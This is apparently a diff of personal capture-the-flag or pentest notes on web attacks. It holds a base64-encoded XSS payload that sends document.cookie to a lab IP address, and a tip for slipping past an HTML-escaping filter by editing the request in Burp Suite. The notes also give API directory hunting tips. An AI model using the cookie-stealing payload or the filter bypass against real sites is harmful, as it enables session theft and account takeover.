@@ -287,4 +287,15 @@ Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
 Upgrade-Insecure-Requests: 1
 
 fname=test&lname=test1&email=test%40gmail.com&phone=093847576&message=Hihello;PGltZyBzcmM9eCBvbmVycm9yPWZldGNoKCdodHRwOi8vMTAuMTAuMTYuMjUvP2M9Jytkb2N1bWVudC5jb29raWUpOz4=
+____________________________________________________________________________________________________________________________________________
+First time when you inject in comment session like that 
+<script>alert(1)</script>
 
+It will be filtered with &gt and &lt
+
+***But, when you inject with normal message('aaaa'), and change <script>alert(1)</script> in burpsuite; it will be injected.***
+____________________________________________________________________________________________________________________________________________
+Need to search directories in /api
+Sometimes User API and Admin API can be same.
+
+jsleak is an easy-to-use command-line tool designed to uncover secrets and links in JavaScript files or source code.
